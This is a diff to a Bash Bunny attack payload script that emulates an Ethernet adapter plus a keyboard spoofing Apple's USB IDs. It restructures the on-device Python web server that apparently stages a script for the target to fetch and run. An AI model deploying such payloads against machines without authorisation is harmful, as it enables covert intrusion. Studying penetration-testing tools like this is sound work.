@@ -18,12 +18,27 @@ ATTACKMODE ECM_ETHERNET HID VID_0X05AC PID_0X021E
 
 source bunny_helpers.sh
 
-# switch to payload directory
-cd /root/udisk/payloads/$SWITCH_POSITION
+payload_dir=/root/udisk/payloads/$SWITCH_POSITION
+log_file=$payload_dir/shellexec.log
+
+cd $payload_dir
 
 # starting server
 LED R G 500
-python -c "import SimpleHTTPServer; import BaseHTTPServer; h=BaseHTTPServer.HTTPServer(('$HOST_IP', 80),SimpleHTTPServer.SimpleHTTPRequestHandler); h.serve_forever();" &> server.log &
+
+cat <<EOF | python &>> $log_file &
+import SimpleHTTPServer
+import BaseHTTPServer
+import SocketServer
+
+#Disable logging DNS lookups
+BaseHTTPServer.BaseHTTPRequestHandler.address_string = lambda self: str('$TARGET_IP')
+
+settings = ('$HOST_IP',80)
+Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
+httpd = SocketServer.TCPServer(settings, Handler)
+httpd.serve_forever();
+EOF
 
 # wait until port is listening
 while ! nc -z $HOST_IP 80; do sleep 0.2; done
